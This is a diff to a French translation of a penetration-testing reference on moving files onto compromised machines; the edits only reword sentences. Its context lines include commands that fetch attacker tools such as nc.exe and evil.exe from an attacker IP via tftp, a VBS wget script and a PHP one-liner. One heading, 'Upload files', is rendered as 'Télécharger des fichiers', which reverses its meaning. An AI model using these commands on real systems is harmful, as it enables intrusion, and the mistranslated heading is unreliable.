@@ -55,10 +55,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload files
+### Télécharger des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer imprimant GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -267,7 +267,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Téléchargez un fichier avec une ligne de commande PHP :
+Téléchargez un fichier avec un oneliner PHP :
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` permet non seulement l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hex**. Cela signifie qu'en fournissant un hex d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation d'assemblage des fichiers jusqu'à 64 ko de taille**.
+Le programme `debug.exe` permet non seulement d'inspecter des binaires mais a également la **capacité de les reconstruire à partir de l'hex**. Cela signifie qu'en fournissant un hex d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation d'assemblage des fichiers jusqu'à 64 ko**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
